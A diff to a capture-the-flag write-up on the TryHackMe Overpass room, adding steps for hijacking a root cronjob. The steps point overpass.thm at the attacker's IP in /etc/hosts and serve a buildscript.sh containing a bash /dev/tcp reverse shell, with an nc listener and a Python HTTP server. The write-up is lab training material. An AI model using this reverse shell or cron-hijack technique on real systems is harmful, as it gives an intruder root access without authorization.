@@ -71,6 +71,7 @@ Let's check if we can exploit a cronjob.
 We can see there's a buildscript.sh run from overpass.thm/downloads/src. If we can edit /etc/hosts I can set overpass.thm to my IP and get root privilege with a reverse shell.
 
 First we edit /etc/hosts and put our own IP in.
+
 ![etchosts](/thm/images/overpass/etchosts.png)
 
 Then we go back our own machine and create the exact same folders: downloads/src
@@ -78,8 +79,23 @@ Then we go back our own machine and create the exact same folders: downloads/src
 ```
 mkdir -p downloads/src
 ```
-Create a buildscript.sh in the src folder and put the reverse shell in there
+Create a buildscript.sh in the src folder and paste the reverse shell in there.
 
 ```
 bash -i >& /dev/tcp/<your_ip>/4444 0>&1
 ```
+We listen on port 4444 for a connection from the reverse shell.
+
+```
+nc -lnvp 4444
+```
+![nc](/thm/images/overpass/nc.png)
+
+At the same time we start the http server and wait.
+
+```
+sudo python -m SimpleHTTPServer 80
+```
+![http](/thm/images/overpass/httpserver.png)
+
+Hope this writeup helped you!
